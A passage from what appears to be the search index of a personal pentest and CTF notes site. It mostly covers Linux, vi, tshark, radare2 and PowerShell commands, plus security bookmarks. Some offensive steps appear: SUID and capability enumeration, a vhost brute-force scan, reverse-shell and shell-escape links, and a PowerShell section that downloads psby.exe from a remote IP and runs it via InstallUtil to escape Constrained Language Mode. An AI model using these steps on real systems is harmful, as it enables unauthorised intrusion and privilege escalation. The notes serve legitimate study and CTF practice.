show backgrounded jobs with pid\njobs -l\n\n# kill 1st backgrounded\nkill %1\n</code></pre>"},{"location":"Linux/useful_linux_commands/#string-manipulation","title":"String manipulation","text":"<pre><code># reverse a string\necho \"Hello there\"|rev\n</code></pre>"},{"location":"Linux/useful_linux_commands/#grep-for-lines-of-a-specific-length","title":"grep for lines of a specific length","text":"<p>https://unix.stackexchange.com/questions/184519/how-to-grep-for-line-length-in-a-given-range</p> <pre><code>grep -x '.\\{3,10\\}'\nwhere\n\n-x match pattern to whole line\n. any symbol\n{3,10} quantify from 3 to 10 times previous symbol (in the case any ones)\n</code></pre>"},{"location":"Linux/useful_linux_commands/#exiftool-read-and-write-meta-information-in-files","title":"exiftool - Read and write meta information in files","text":"<pre><code>exiftool &lt;file&gt;\n</code></pre>"},{"location":"Linux/useful_linux_commands/#what-is-running-on-local-ports-linux","title":"what is running on local ports (linux):","text":"<p>https://www.cyberciti.biz/faq/what-process-has-open-linux-port/</p> <pre><code>netstat -tulpn\n\nss -tulpn\n</code></pre>"},{"location":"Linux/useful_linux_commands/#remove-line-breaks-from-file","title":"remove line breaks from file","text":"<pre><code>tr -d '\\n' &lt; yourfile.txt\n</code></pre>"},{"location":"Linux/useful_linux_commands/#symbolic-links","title":"symbolic links","text":"<pre><code>ln -s file1 link1\n</code></pre>"},{"location":"Linux/useful_linux_commands/#cron-syntax","title":"Cron syntax","text":"<pre><code># \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 minute (0 - 59)\n# \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 hour (0 - 23)\n# \u2502 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 day of the month (1 - 31)\n# \u2502 \u2502 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 month (1 - 12)\n# \u2502 \u2502 \u2502 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 day of the week (0 - 6) (Sunday to Saturday;\n# \u2502 \u2502 \u2502 \u2502 \u2502                                   7 is also Sunday on some systems)\n# \u2502 \u2502 \u2502 \u2502 \u2502\n# \u2502 \u2502 \u2502 \u2502 \u2502\n# * * * * * command to execute\n</code></pre>"},{"location":"Linux/useful_linux_commands/#curl-through-proxy-for-burp","title":"Curl through proxy (for burp):","text":"<pre><code>curl --proxy http://localhost:8080 &lt;URL&gt;\n\n-x, --proxy &lt;[protocol://][user:password@]proxyhost[:port]&gt;\n</code></pre> <p>Remove password from ssh key https://stackoverflow.com/questions/112396</p> <pre><code>ssh-keygen -p [-P old_passphrase] [-N new_passphrase] [-f keyfile]\n</code></pre> <p>rlwrap (readline wrapper)</p> <p>rlwrap runs the specified command, intercepting user input in order to provide readline's line editing, persistent history and completion.</p> <p>https://stackoverflow.com/questions/28878995/check-if-a-field-is-an-integer-in-awk</p> <pre><code>cat full_nmap.nmap | awk -F\"/\" '$1 ~ /^[0-9]+$/ {print $1}'\ncat full_nmap.nmap | awk -F\"/\" '$1 ~ /^[0-9]+$/ {print $1}'|tr '\\n' ','\ncat full_nmap.nmap | awk -F\"/\" '$1 ~ /^[0-9]+$/ {print $1}'|tr '\\n' ','| rev | cut -c 2- | rev\n</code></pre> <p>get full path (useful in conjunction with find function):</p> <pre><code>root@kali:~/Documents/github# find . -name \"*.pdf\" -exec readlink -f {} \\;\n/root/Documents/github/CTF_notes/2019-KringleCon/Documents/LetterToElfUPersonnel.pdf\n</code></pre> <pre><code>find path_to_files/* -type f -print0 |xargs -0 file -i|grep application/octet-stream|awk -F \":\" '{ print $1 }'|xargs rm\n</code></pre> <p>Open file from terminal:</p> <pre><code># generic\nxdg-open filename.xxxx\n\n# until Xenial (16.04):\ngvfs-open file2open.xxx\n\n# starting with Artful (17.10):\ngio open file2open.xxx\n</code></pre> <p>\"Colorize\" output</p> <pre><code># install pygments python package\npip install Pygments\n\nalias ccat='pygmentize -O bg=dark,style=colorful'\n</code></pre> <p>Compare contents of two files</p> <pre><code>comm [-1] [-2] [-3] file1 file2\n-1 Suppress the output column of lines unique to file1\n-2 Suppress the output column of lines unique to file2\n-3 Suppress the output column of lines duplicated in file1 and file2\n</code></pre>"},{"location":"Linux/useful_linux_commands/#date-formatting","title":"Date formatting","text":"<pre><code>date --date='TZ=\"America/New_York\" 9:00'\ndate --date='TZ=\"America/New_York\" 9:00 PM'\ndate +%m/%d/%Y\\ %H:%M\n</code></pre> <p>Find symlinks:</p> <pre><code>find . -type l -user `whoami` 2&gt;/dev/null\n</code></pre>"},{"location":"Linux/useful_linux_commands/#text-processing","title":"Text Processing","text":""},{"location":"Linux/useful_linux_commands/#return-2nd-column-from-tab-delimited-file","title":"Return 2nd column from tab delimited file:","text":"<pre><code>cat filename | cut -f2 -d$'\\t'\n</code></pre>"},{"location":"Linux/useful_linux_commands/#remove-leading-spaces","title":"Remove leading spaces:","text":"<pre><code>echo \"      this is a test\" | sed -e \"s/^[ \\t]*//\"\n</code></pre>"},{"location":"Linux/useful_linux_commands/#find-all-files-containing-specific-text","title":"Find all files containing specific text:","text":"<pre><code>grep -rnw 'path/to/somewhere' -e 'pattern'\n</code></pre>"},{"location":"Linux/useful_linux_commands/#padding-within-bash","title":"padding within bash","text":"<pre><code>for i in $(seq -f \"%05g\" 10 15)\ndo\necho $i\ndone\n</code></pre>"},{"location":"Linux/useful_linux_commands/#print-1st-column","title":"Print 1st column:","text":"<pre><code>cut -d' ' -f1  &lt;&lt;&lt; \"12/12/2013 14:32\"\nawk '{print $1}' &lt;&lt;&lt; \"12/12/2013 14:32\"\nsed 's/ .*//' &lt;&lt;&lt; \"12/12/2013 14:32\"\ngrep -o \"^\\S\\+\"  &lt;&lt;&lt; \"12/12/2013 14:32\"\nperl -lane 'print $F[0]' &lt;&lt;&lt; \"12/12/2013 14:32\"\n</code></pre> <p>find ./ -type d -empty -delete find ./ -type f -size 0 -delete</p> <p>Bash - get chr and ord functions:</p> <pre><code>chr() {\n  [ \"$1\" -lt 256 ] || return 1\n  printf \"\\\\$(printf '%03o' \"$1\")\"\n}\n\nord() {\n  LC_CTYPE=C printf '%d' \"'$1\"\n}\n</code></pre> <p>Example:</p> <pre><code>chr 65\n</code></pre> <p><code>Result: A</code></p> <p>Curl - resolve hostname: <code>curl --resolve 'yada.com:80:127.0.0.1' http://yada.com/something</code> https://stackoverflow.com/questions/3390549/set-curl-to-use-local-virtual-hosts</p> <p>Grep for line of a specific length: https://unix.stackexchange.com/questions/184519/how-to-grep-for-line-length-in-a-given-range</p> <pre><code>grep -x '.\\{3,10\\}'\n\n     -x match pattern to whole line\n     . any symbol\n     {3,10} quantify from 3 to 10 times previous symbol\n</code></pre> <p>https://stackoverflow.com/questions/11967776/swap-two-columns-awk-sed-python-perl</p> <pre><code>awk ' { t = $1; $1 = $2; $2 = t; print; } ' input_file\n</code></pre> <p>awk: https://stackoverflow.com/questions/13046167/printing-the-last-column-of-a-line-in-a-file Print last column of a line containing \"A1\"</p> <pre><code>awk '/A1/ {print $NF}' file\n</code></pre> <p>Copy files using ssh identity file:</p> <pre><code>#send to remote host:\nscp -i KEYFILE FILENAME USER@SERVER:/home/USER/FILENAME\n\n#pull from remote host (save locally):\nscp -i KEYFILE USER@SERVER:/home/USER/FILENAME /home/USER/FILENAME\n</code></pre> <p>Get Path of file/directory (Linux):</p> <pre><code>readlink -f filename\n\nrealpath filename\n</code></pre> <p>Open images from terminal</p> <pre><code>eog filename\n\ndisplay filename # from ImageMagick\n</code></pre> <p>Parse Markdown (e.g., README.md):</p> <pre><code>pandoc -t html README.md | lynx -stdin\npandoc -f gfm -t html5 README.md\n</code></pre>"},{"location":"Linux/useful_linux_commands/#linux-file-permissions","title":"Linux file permissions","text":"<pre><code>$ ls -l\ndrwxr-xr-x 4 cliff user 1024 Jun 18 09:40 WAITRON_EARNINGS\n-rw-r--r-- 1 cliff user 767392 Jun 6 14:28 scanlib.tar.gz\n^ ^ ^  ^   ^ ^     ^    ^      ^     ^     ^\n| | |  |   | |     |    |      |     |     |\n| | |  |   | owner group size  date  time  name\n| | |  |   number of links to file or directory contents\n| | |  permissions for world\n| | permissions for members of group\n| permissions for owner of file: r = read, w = write, x = execute -=no permission\ntype of file: - = normal file, d=directory, l = symbolic link, and others...\n\nls -a List the current directory including hidden files. Hidden files start with \".\"\nls -ld * List all the file and directory names in the current directory using long format. Without the \"d\" option, ls would list the contents of any sub-directory of the current. With the \"d\" option, ls just lists them like regular files.\n</code></pre> Integer Value Permissions Binary 7 Full 111 6 Read and write 110 5 Read and execute 101 4 Read only 100 3 Write and execute 011 2 Write only 010 1 Execute only 001 0 None 000"},{"location":"Linux/useful_linux_commands/#finding-files","title":"Finding files","text":"<pre><code>find -maxdepth 1 -type f -writable # writable files\n    -maxdepth 1\n    -type f\n    -type d\n    -writable\n    -executable\n    -readable\n    -user &lt;username&gt;\n    -group &lt;groupname&gt;\n    -size &lt;size_in_bytes&gt;\n    -perm &lt;permission&gt;\n    -mtime [-,+]&lt;number_days&gt;\n\n# exclude directory(s) in Find\nfind / -path /proc -prune -o\nfind / \\( -path dir1 -o -path dir2 -o -path dir3 \\) -prune -o\n\n# find text that is human-readable, 1033 bytes in size, not executable\nfind . -type f -size 1033c ! -executable -exec file {} + | grep ASCII\n\n# Find Setuid binaries\nfind /bin -perm -4000\nfind / -xdev -user root \\( -perm -4000 -o -perm -2000 \\) 2&gt;/dev/null\n\nfind / -perm -u=s -type f 2&gt;/dev/null\nfind / -uid 0 -perm -4000 -type f 2&gt;/dev/null\n\nfind / -user root -perm -4000 -print 2&gt;/dev/null\nfind / -user root -perm -4000 2&gt;/dev/null -exec ls -ldb {} \\;\n\n# Find all files containing specific text:\n    grep -rnw '/path/to/somewhere/' -e 'pattern'\n    -r or -R is recursive,\n    -n is line number, and\n    -w stands for match the whole word.\n    -l (lower-case L) can be added to just give the file name of matching files.\n    --exclude\n    --include\n    --exclude-dir\n    --include-dir\n\n    examples:\n        grep --include=\\*.{c,h} -rnw '/path/to/somewhere/' -e \"pattern\"         # having .c or .h extensions\n        grep --exclude=*.o -rnw '/path/to/somewhere/' -e \"pattern\"              #exclude files ending with .o extension\n        grep --exclude-dir={dir1,dir2,*.dst} -rnw '/path/to/somewhere/' -e \"pattern\"    #exclude the dirs dir1/, dir2/ and all of them matching *.dst/\n</code></pre>"},{"location":"Linux/useful_linux_commands/#finding-files-based-on-permissions","title":"Finding files based on permissions","text":"<p>http://www.tutonics.com/2012/12/find-files-based-on-their-permissions.html</p>"},{"location":"Linux/useful_linux_commands/#finding-files-with-capabilities-set","title":"Finding files with capabilities set","text":"<pre><code>getcap -r / 2&gt;/dev/null\n</code></pre>"},{"location":"Linux/useful_linux_commands/#basics-of-the-vi-editor","title":"Basics of the vi editor","text":"<pre><code>Opening a file\n  vi filename\n\nCreating text\n  Edit modes: These keys enter editing modes and type in the text\n  of your document.\n  i Insert before current cursor position\n  I Insert at beginning of current line\n  a Insert (append) after current cursor position\n  A Append to end of line\n  r Replace 1 character\n  R Replace mode\n  &lt;ESC&gt; Terminate insertion or overwrite mode\n\nDeletion of text\n  x Delete single character\n  dd Delete current line and put in buffer\n  ndd Delete n lines (n is a number) and put them in buffer\n  J Attaches the next line to the end of the current line (deletes carriage return).\n\nOops\n  u Undo last command\n\ncut and paste\n  yy Yank current line into buffer\n  nyy Yank n lines into buffer\n  p Put the contents of the buffer after the current line\n  P Put the contents of the buffer before the current line\n\ncursor positioning\n  ^d Page down\n  ^u Page up\n  :n Position cursor at line n\n  :$ Position cursor at end of file\n  ^g Display current line number\n  h,j,k,l Left,Down,Up, and Right respectivly. Your arrow keys should also work if\n   if your keyboard mappings are anywhere near sane.\n\nstring substitution\n  :n1,n2:s/string1/string2/[g] Substitute string2 for string1 on lines\n  n1 to n2. If g is included (meaning global),\n  all instances of string1 on each line\n  are substituted. If g is not included,\n  only the first instance per matching line is\n  substituted.\n  ^ matches start of line\n  . matches any single character\n  $ matches end of line\n  These and other \"special characters\" (like the forward slash) can be \"escaped\" with \\\n  i.e to match the string \"/usr/STRIM100/SOFT\" say \"\\/usr\\/STRIM100\\/SOFT\"\n  Examples:\n  :1,$:s/dog/cat/g Substitute 'cat' for 'dog', every instance\n   for the entire file - lines 1 to $ (end of file)\n  :23,25:/frog/bird/ Substitute 'bird' for 'frog' on lines\n   23 through 25. Only the first instance\n   on each line is substituted.\n\nThese commands are all prefixed by pressing colon (:) and then entered in the lower\nleft corner of the window. They are called \"ex\" commands because they are commands\nof the ex text editor - the precursor line editor to the screen editor\nvi. You cannot enter an \"ex\" command when you are in an edit mode (typing text onto the screen)\nPress &lt;ESC&gt; to exit from an editing mode.\n:w Write the current file.\n:w new.file Write the file to the name 'new.file'.\n:w! existing.file Overwrite an existing file with the file currently being edited.\n:wq Write the file and quit.\n:q Quit.\n:q! Quit with no changes.\n:e filename Open the file 'filename' for editing.\n:set number Turns on line numbering\n:set nonumber Turns off line numbering\n</code></pre>"},{"location":"Linux/useful_linux_commands/#miscellaneous-apt-and-deb-stuff","title":"Miscellaneous apt and deb stuff","text":"<p>see installed packages</p> <pre><code>apt list --installed\n\nfor older versions\ndpkg --get-selections\n# or\ndpkg -l\n</code></pre> <p>https://versprite.com/blog/apt-mitm-package-injection/ https://blog.packagecloud.io/eng/2017/03/23/create-debian-repository-reprepro/</p>"},{"location":"Recon_and_Enumeration/","title":"Recon and Enumeration","text":"<p>miscellaneous recon and enumeration stuff</p>"},{"location":"Recon_and_Enumeration/#nmap","title":"nmap","text":"<pre><code>nmap -sC -sV -oA outfile IP\n</code></pre>"},{"location":"Recon_and_Enumeration/#dns","title":"DNS","text":"<pre><code>nslookup\n&gt; server IP\n\ndig axfr @ IP alt-hostname\n</code></pre>"},{"location":"Recon_and_Enumeration/#wordpress","title":"Wordpress","text":"<pre><code>wpscan --url http://TARGET --enumerate u --log\n</code></pre>"},{"location":"Recon_and_Enumeration/#vhost-discovery","title":"vhost discovery:","text":"<p>from github.com/jobertabma/virtual-host-discovery</p> <p>Create a wordlist from SecLists fierce_hostlist:</p> <pre><code>sed 's/$/.\\%s/g' /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt &gt; ~/opt/virtual-host-discovery/fierce-hostlist.txt\n</code></pre> <pre><code># get Content Length webpage without virtual host (to be used as a filter):\ncontent_length=$(curl -sI http://cache.htb | grep 'Content-Length' | cut -d \" \" -f 2)\n\nruby ~/opt/virtual-host-discovery/scan.rb --ip=10.10.10.188 --port 80 --host=htb --ignore-content-length=$content_length --wordlist=~/opt/virtual-host-discovery/fierce_hostlist.txt\n</code></pre>"},{"location":"Recon_and_Enumeration/#look-for-git-repos","title":"Look for git repos:","text":"<pre><code>find -type d -name \".git\" 2&gt;/dev/null\n</code></pre>"},{"location":"Recon_and_Enumeration/#gittools","title":"GitTools","text":"<p>https://github.com/internetwache/GitTools</p>"},{"location":"Recon_and_Enumeration/networking/","title":"Networking","text":"<pre><code>tshark -r WebSearchingFlagCTF2019.pcapng -Y http.request.uri.query -T fields -e http.request.uri.query\n\ntshark -r WebSearchingFlagCTF2019.pcapng -Y http.request.uri.query -T fields -e http.request.uri.query -e frame.time\n</code></pre> <p>https://www.activecountermeasures.com/blog-tshark-examples-for-extracting-ip-fields/</p> <p>Extracting files from captures for HTTP and SMB:</p> <pre><code>tshark -nr capture.pcap --export-objects smb,./\n</code></pre> <p>Examining HTTP traffic metadata tree of all of the HTTP traffic:</p> <pre><code>tshark -r capture.pcap -q -z http,tree\n</code></pre> <p>Unique list of ports in nmap scan capture:</p> <pre><code>tshark -r nmap_scan.pcapng -T fields -e tcp.srcport ip.src == 10.0.2.6 and frame.len != 60 | sort -n | uniq\n</code></pre> <p>https://www.packettotal.com/</p> <p>Look through all UDP streams for ctf-flag</p> <pre><code>flag=picoCTF; PCAP=capture.pcap; END=$(tshark -r $PCAP -T fields -e udp.stream | sort -n | tail -1); for ((i=0;i&lt;=END;i++)); do tshark -r $PCAP -Y \"udp.stream eq $i\" -T fields -e data.text -o data.show_as_text:TRUE 2&gt;/dev/null | tr -d '\\n' | grep \"$flag\"; if [ $? -eq 0 ]; then echo \"(Stream #$i)\"; fi; done\n</code></pre> <p>Resources: * https://www.maki.bzh/articles/wiresharkhowtobasic/</p>"},{"location":"Resources/links_and_references/","title":"bookmarks and reading","text":""},{"location":"Resources/links_and_references/#docker","title":"Docker","text":"<p>A good collection of resources to study https://gist.github.com/FrankSpierings/5c79523ba693aaa38bc963083f48456c</p> <p>Some pwnable writeups that are pretty good for understanding how one might attack a container infrastructure https://www.notsosecure.com/vulnerable-docker-vm/ https://resources.infosecinstitute.com/donkeydocker1-ctf-walkthrough/ https://kitctf.de/writeups/32c3ctf/docker</p> <p>Common things to look out for:</p> <p>Mounted Docker Socket Some facet of the container intentionally/unintentionally weakened, read up on the top link for the various areas plus this https://ericchiang.github.io/post/containers-from-scratch/ which walks through some of the ways in which systems like docker and lxc operate</p>"},{"location":"Resources/links_and_references/#miscellaneous","title":"Miscellaneous","text":"<p>https://2017game.picoctf.com/game/level-1 https://mail.google.com/mail/u/0/#inbox https://null-byte.wonderhowto.com/how-to/hack-like-a-pro/ https://s3ctur.wordpress.com/2017/06/19/breaking-into-infosec-a-beginners-curriculum/ https://monkeysm8.gitbooks.io/pentesting-methodology/common_portsservices_and_how_to_use_them/port_21_-_ftp.html https://uwnthesis.wordpress.com/2016/06/25/penetration-testing-tools-cheat-sheet/ https://dashboard.heroku.com/apps http://www.blackhat.com/us-13/arsenal.html#Sood https://requestb.in/</p> <p>https://chat.netsecfocus.com/nsf/</p> <p>http://overthewire.org/wargames/natas/ http://pwnable.kr/play.php https://jivoi.github.io/2015/07/01/pentest-tips-and-tricks/</p>"},{"location":"Resources/links_and_references/#tmux-shortcuts-cheatsheet","title":"tmux shortcuts &amp; cheatsheet","text":"<p>https://gist.github.com/MohamedAlaa/2961058</p> <p>https://github.com/ethicalhack3r/SecLists https://github.com/ethicalhack3r/passive-spider https://github.com/ethicalhack3r/my-scripts https://github.com/ethicalhack3r/scripts https://github.com/ethicalhack3r/wordpress_plugin_security_testing_cheat_sheet</p> <p>https://explainshell.com/</p>"},{"location":"Resources/links_and_references/#xss","title":"XSS","text":"<p>https://breakdev.org/sniping-insecure-cookies-with-xss/ https://pentest-tools.com/blog/xss-attacks-practical-scenarios/</p>"},{"location":"Resources/links_and_references/#mr-robot","title":"MR Robot","text":"<p>https://www.whoismrrobot.com/ https://www.reddit.com/r/ARGsociety/wiki/index https://www.reddit.com/r/ARGsociety/wiki/welcome https://jobs.runpula.net/ https://www.whoismrrobot.com/fs/images/fsoc/FIXM_US_Extension_v3_0_Logical_Model_Diagrams.pdf</p>"},{"location":"Resources/links_and_references/#atom-text-editor","title":"Atom text editor","text":"<p>https://flight-manual.atom.io/hacking-atom/</p> <p>https://www.hackthebox.eu/home/teams/profile/806</p> <p>https://github.com/mininet/mininet/wiki/BGP-Path-Hijacking-Attack-Demo https://www.isi.deterlab.net/file.php?file=/share/shared/BGPhijacking</p>"},{"location":"Resources/links_and_references/#return-oriented-programming","title":"return oriented programming","text":"<p>http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html https://github.com/chrysh/ctf_writeups/tree/master/radare2/return_to_libc https://github.com/ctfhacker/ctf-writeups/blob/master/campctf-2015/bitterman-pwn-400/README.md</p>"},{"location":"Resources/links_and_references/#ssh-certificates","title":"SSH / certificates","text":"<p>https://code.fb.com/production-engineering/scalable-and-secure-access-with-ssh/</p> <p>https://www.owasp.org/index.php/OWASP_Testing_Projecti https://www.owasp.org/images/1/19/OTGv4.pdf https://sites.google.com/site/bughunteruniversity/ https://www.hackerone.com/blog/resources-for-new-hackers</p>"},{"location":"Resources/links_and_references/#openldap","title":"OpenLDAP","text":"<p>https://www.bo.cnr.it/servinfo/OpenLdap.pdf http://www.openldap.org/doc/admin24/OpenLDAP-Admin-Guide.pdf</p> <p>https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</p> <p>https://www.bugcrowd.com/discovering-subdomains/ https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh</p> <p>https://gist.github.com/vratiu/9780109</p>"},{"location":"Resources/links_and_references/#writeups","title":"Writeups:","text":"<ul> <li>https://github.com/Hackplayers/hackthebox-writeups/</li> <li>https://raw.githubusercontent.com/Hackplayers/hackthebox-writeups/master/machines/Arkham/wilsonnkwan-arkham.pdf</li> <li>https://www.vulndev.io/</li> <li>https://www.vulndev.io/2019/05/htb_ellingson.html</li> <li>http://avengerinator.blogspot.com/2018/05/hack-box-hacktheboxeu-htb-crypto.html</li> <li> <p>http://avengerinator.blogspot.com/2019/01/hack-box-hacktheboxeu-htb-stego.html</p> </li> <li> <p>https://www.rootnetsec.com/picoctf-weird-rsa/</p> </li> <li>https://0day.work/how-i-recovered-your-private-key-or-why-small-keys-are-bad/</li> </ul>"},{"location":"Resources/links_and_references/#reverse-shells","title":"Reverse Shells","text":"<p>http://blog.safebuff.com/2016/06/19/Reverse-shell-Cheat-Sheet/ https://github.com/lanjelot/kb/blob/master/reverse-shells https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</p>"},{"location":"Resources/links_and_references/#linux-container","title":"Linux Container","text":"<p>https://gist.github.com/FrankSpierings/5c79523ba693aaa38bc963083f48456c</p>"},{"location":"Resources/links_and_references/#binaries","title":"Binaries","text":"<p>https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64</p>"},{"location":"Resources/links_and_references/#upload-restrictions-bypass","title":"Upload restrictions bypass","text":"<p>https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf</p>"},{"location":"Resources/links_and_references/#linux-restricted-shell-bypass","title":"Linux Restricted Shell Bypass","text":"<p>https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf http://securebean.blogspot.com/2014/05/escaping-restricted-shell_3.html http://pentestmonkey.net/blog/rbash-scp https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells</p>"},{"location":"Resources/links_and_references/#tmux","title":"tmux","text":"<p>https://gist.github.com/MohamedAlaa/2961058</p>"},{"location":"Resources/links_and_references/#tcpdump","title":"tcpdump","text":"<p>https://hackertarget.com/tcpdump-examples/</p>"},{"location":"Resources/links_and_references/#text-conversion-transformation","title":"text conversion / transformation","text":"<p>https://cryptii.com/ https://gchq.github.io/CyberChef/</p>"},{"location":"Resources/links_and_references/#xss_1","title":"xss","text":"<p>http://xssor.io/</p>"},{"location":"Resources/links_and_references/#buffer-overflow","title":"Buffer Overflow","text":""},{"location":"Resources/links_and_references/#to-find-system-exit-and-bash-addresses","title":"to find system, exit, and bash addresses","text":"<p>https://0xdeadbeef.info/code/libc-search.c</p>"},{"location":"Resources/links_and_references/#openvpn-config-reverse-shell","title":"Openvpn config reverse shell","text":"<p>https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da</p>"},{"location":"Resources/links_and_references/#wildcard-exploitation","title":"Wildcard exploitation","text":"<p>http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt</p>"},{"location":"Resources/links_and_references/#temporary-email-address","title":"Temporary email address","text":"<p>https://temp-mail.org/en/</p>"},{"location":"Resources/links_and_references/#add-to-notes-to-sort","title":"ADD TO NOTES (TO SORT)","text":"<p>https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/ https://hakin9.org/web-application-penetration-testing-local-file-inclusion-lfi-testing/ https://github.com/lucyoa/ctf-wiki/tree/master/web/file-inclusion https://github.com/swisskyrepo/PayloadsAllTheThings https://github.com/p4-team/ctf/tree/master/2016-04-15-plaid-ctf/web_pixelshop</p> <p>https://kaijento.github.io/2017/03/19/bash-read-file-into-array/ https://www.lifewire.com/why-would-you-use-shivi-variable-2196747</p> <p>https://www.computerhope.com/unix/bash/index.htm https://www.computerhope.com/unix/bash/mapfile.htm</p> <p>http://cecs.wright.edu/~pmateti/Courses/233/Top/233-CheatSheet.html</p> <p>https://sushant747.gitbooks.io/total-oscp-guide/list_of_common_ports.html</p>"},{"location":"Resources/links_and_references/#bash-expressions-used-with-if","title":"bash - Expressions used with if","text":"<p>http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_07_01.html</p>"},{"location":"Resources/links_and_references/#python-jail","title":"python jail","text":"<p>https://lbarman.ch/blog/pyjail/ http://wapiflapi.github.io/2013/04/22/plaidctf-pyjail-story-of-pythons-escape/</p>"},{"location":"Reversing/Reversing/","title":"Reversing","text":"<p>Extracting vba code from an office file:</p> <pre><code># sudo apt install oletools\nolevba &lt;filename&gt;\n</code></pre> <p>Resources: * https://opensource.com/article/20/4/linux-binary-analysis</p>"},{"location":"Reversing/radare2/","title":"radare2","text":"<p>common commands: |command|Description| |-|-| |pd|print Disassembly|</p> <pre><code>apt install cmake\napt install bison\napt install libzip-dev\n</code></pre> <pre><code>r2pm init\nr2pm update\n\n# https://github.com/radareorg/r2ghidra-dec\nr2pm -i r2ghidra-dec\n</code></pre> <p>https://github.com/radareorg/cutter</p>"},{"location":"Windows/Powershell/","title":"Windows (Powershell &amp; cmd)","text":""},{"location":"Windows/Powershell/#powershell-commands","title":"Powershell Commands","text":""},{"location":"Windows/Powershell/#useful-cmdlets-and-aliases","title":"Useful Cmdlets (and aliases)","text":"What it does Command aliases Get directory listing Get-ChildItem ls, dir, gci Copy a file <code>Copy-Item src.txt dst.txt</code> cp, copy, cpi Move a file <code>Move-Item src.txt dst.txt</code> mv, move, mi Find text within a file (1) <code>Select-String -path c:\\users\\*.txt -pattern password</code> Find text within a file (2) <code>ls -r c:\\users -file \\| % {Select-String -path $_ -pattern password}</code> Display file contents <code>Get-Content file.txt</code> cat, type, gc) Get present directory <code>Get-Location</code> pwd, gl Get a process listing <code>Get-Process</code> ps, gps Get a service listing <code>Get-Service</code> Formatting output (Format-List) <code>ls \\| Format-List -property name</code> Paginating output <code>ls -r \\| Out-Host -paging</code> Get the SHA1 hash of a file <code>Get-FileHash -Algorithm SHA1 file.txt</code> Exporting output to CSV <code>Get-Process \\| Export-Csv procs.csv</code>"},{"location":"Windows/Powershell/#info-gathering","title":"Info gathering:","text":"<p>Working with Zip files:</p> <pre><code>Expand-Archive -Path Draft.Zip -DestinationPath C:\\Reference\nExpand-Archive -Path Draft.Zip\n</code></pre> <pre><code>https://stackoverflow.com/questions/9682024/how-to-do-what-head-tail-more-less-sed-do-in-powershell/41626586\ngc log.txt | select -first 10 # head\ngc -TotalCount 10 log.txt     # also head\ngc log.txt | select -last 10  # tail\ngc -Tail 10 log.txt           # also tail (since PSv3), also much faster than above option\ngc log.txt | more             # or less if you have it installed\ngc log.txt | %{ $_ -replace '\\d+', '($0)' }         # sed\n</code></pre>"},{"location":"Windows/Powershell/#cmd-stuff","title":"CMD stuff","text":"<pre><code>cipher /U /N\n</code></pre> <p>Alternate Data Stream https://www.howtogeek.com/howto/windows-vista/stupid-geek-tricks-hide-data-in-a-secret-text-file-compartment/</p>"},{"location":"Windows/Powershell/#language-mode","title":"Language Mode","text":""},{"location":"Windows/Powershell/#check-current-language-mode","title":"Check current language mode","text":"<pre><code>$ExecutionContext.SessionState.LanguageMode\n</code></pre>"},{"location":"Windows/Powershell/#escape-constrained-language-mode","title":"Escape Constrained Language Mode","text":"<p>Using psby.exe obtained from here: https://github.com/Resilient-Ninja/Privilege-Escalation-Windows</p> <pre><code>PS &gt; Invoke-WebRequest -Uri http://10.10.14.25/psby.exe -OutFile C:\\windows\\system32\\spool\\drivers\\color\\psby.exe\n\nPS &gt; C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=true /U C:\\windows\\system32\\spool\\drivers\\color\\psby.exe\n</code></pre> <p>https://techvomit.net/useful-powershell-commands/</p>"},{"location":"Windows/Powershell/#where-is-a-binary","title":"Where is a binary:","text":"<pre><code>C:\\Windows\\System32\\where.exe cmd.exe\n</code></pre>"},{"location":"Windows/Powershell/#print-environment-variable","title":"Print environment variable:","text":"<pre><code>echo $Env:Temp\n</code></pre>"},{"location":"Windows/Powershell/#check-if-system-is-64-bit","title":"Check if system is 64 bit","text":"<pre><code>[Environment]::Is64BitOperatingSystem\n</code></pre>"},{"location":"Windows/Powershell/#enable-ise-using-powershell","title":"Enable ISE using Powershell","text":"<pre><code>Import-Module ServerManager\nAdd-WindowsFeature Powershell-ISE\n</code></pre>"},{"location":"Windows/Powershell/#securely-store-credentials-in-xml-for-import","title":"securely store credentials in xml for import","text":"<pre><code>$cred = Get-Credential\n$cred | Export-CliXml &lt;location&gt;.clixml\n$cred2 = Import-CliXml &lt;location&gt;.clixml\n</code></pre>"},{"location":"Windows/Powershell/#command-output-to-file","title":"command output to file","text":"<pre><code>| Out-File &lt;location&gt;\nInvoke-AllChecks | Out-File C:\\temp\\output.txt\n</code></pre>"},{"location":"Windows/Powershell/#command-output-to-clipboard","title":"command output to clipboard","text":"<pre><code>Command | Clip\n</code></pre>"},{"location":"Windows/Powershell/#download-file","title":"download file","text":"<pre><code>Invoke-WebRequest -Uri $url -OutFile $output\n(New-Object System.Net.WebClient).DownloadFile($url, $output)\n\nStart-BitsTransfer -Source $url -Destination $output\nStart-BitsTransfer -Source $url -Destination $output 